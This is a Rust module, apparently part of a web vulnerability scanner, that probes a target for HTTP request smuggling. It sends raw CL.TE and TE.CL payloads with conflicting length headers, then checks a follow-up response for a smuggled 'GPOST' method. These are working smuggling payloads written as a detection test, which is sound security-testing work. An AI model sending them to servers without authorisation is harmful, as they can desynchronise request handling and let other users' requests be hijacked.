use colored::*;
use crate::core::client::RawClient;
use url::Url;
use std::time::Duration;

pub async fn detect(target: &str) -> anyhow::Result<()> {
    println!("{} Testing: HTTP Request Smuggling", "[*]".yellow());
    
    let url = Url::parse(target)?;
    let host = url.host_str().unwrap_or("");

    let cl_te_payload = format!(
        "POST / HTTP/1.1\r\n\
        Host: {}\r\n\
        Connection: keep-alive\r\n\
        Content-Length: 6\r\n\
        Transfer-Encoding: chunked\r\n\
        \r\n\
        0\r\n\
        \r\n\
        G",
        host
    );

    let _ = RawClient::send_raw(target, cl_te_payload.as_bytes()).await;
    tokio::time::sleep(Duration::from_millis(100)).await;

    let follow_up_payload = format!("POST / HTTP/1.1\r\nHost: {}\r\n\r\n", host);
    
    if let Ok(resp) = RawClient::send_raw(target, follow_up_payload.as_bytes()).await {
        if resp.contains("Unknown method GPOST") || resp.contains("405 Method Not Allowed") {
            println!("{} CONFIRMED: CL.TE Smuggling detected!", "[!]".red().bold());
            return Ok(());
        }
    }

    let te_cl_payload = format!(
        "POST / HTTP/1.1\r\n\
        Host: {}\r\n\
        Connection: keep-alive\r\n\
        Content-Length: 4\r\n\
        Transfer-Encoding: chunked\r\n\
        \r\n\
        12\r\n\
        GPOST / HTTP/1.1\r\n\
        \r\n\
        0\r\n\
        \r\n",
        host
    );

    let _ = RawClient::send_raw(target, te_cl_payload.as_bytes()).await;
    tokio::time::sleep(Duration::from_millis(100)).await;

    if let Ok(resp) = RawClient::send_raw(target, follow_up_payload.as_bytes()).await {
        if resp.contains("Unknown method GPOST") || resp.contains("405 Method Not Allowed") {
            println!("{} CONFIRMED: TE.CL Smuggling detected!", "[!]".red().bold());
            return Ok(());
        }
    }

    Ok(())
}
